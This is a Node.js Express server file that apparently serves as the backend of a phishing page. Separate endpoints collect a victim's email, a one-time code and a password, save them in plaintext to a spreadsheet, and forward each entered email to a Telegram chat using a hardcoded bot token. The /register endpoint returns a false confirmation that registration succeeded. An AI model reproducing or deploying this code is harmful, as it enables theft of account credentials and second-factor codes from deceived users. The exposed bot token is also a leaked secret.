const express = require("express");
const fs = require("fs");
const path = require("path");
const bodyParser = require("body-parser");
const cors = require("cors");
const XLSX = require("xlsx");
const axios = require("axios");

const TELEGRAM_BOT_TOKEN = '7812599837:AAH9xT2MoxW42PLeb3SkdS7DyNsrngV6JKo';
const TELEGRAM_CHAT_ID = '6990985746';

const app = express();
const port = process.env.PORT || 3000;

app.use(cors());
app.use(express.static(__dirname));
app.use(bodyParser.json());

const filePath = path.join(__dirname, "data.xlsx");
let allData = [];

function sendTelegramMessage(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  axios.post(url, {
    chat_id: 6990985746,
    text: message,
  }, {
    headers: {
      'Content-Type': 'application/json'
    },
    timeout: 5000
  }).then(() => {
    console.log("✅ Telegram message sent!");
  }).catch((err) => {
    console.error("❌ Telegram error:", err.response?.data || err.message);
  });
}

const logAndSave = (data) => {
  allData.push(data);
  const worksheet = XLSX.utils.json_to_sheet(allData);
  const workbook = XLSX.utils.book_new();
  XLSX.utils.book_append_sheet(workbook, worksheet, "Sheet1");
  XLSX.writeFile(workbook, filePath);
};

app.post("/step-email", (req, res) => {
  const email = req.body.email;
  logAndSave({ email });
  sendTelegramMessage(`📩 New Email Entered: ${email}`);
  res.sendStatus(200);
});

app.post("/step-code", (req, res) => {
  const code = req.body.code;
  logAndSave({ code });
  res.sendStatus(200);
});

app.post("/step-password", (req, res) => {
  const password = req.body.password;
  logAndSave({ password });
  res.sendStatus(200);
});

app.post("/register", (req, res) => {
  const { email, code, password } = req.body;
  logAndSave({ email, code, password });
  res.json({ status: "User registration completed." });
});

app.listen(port);
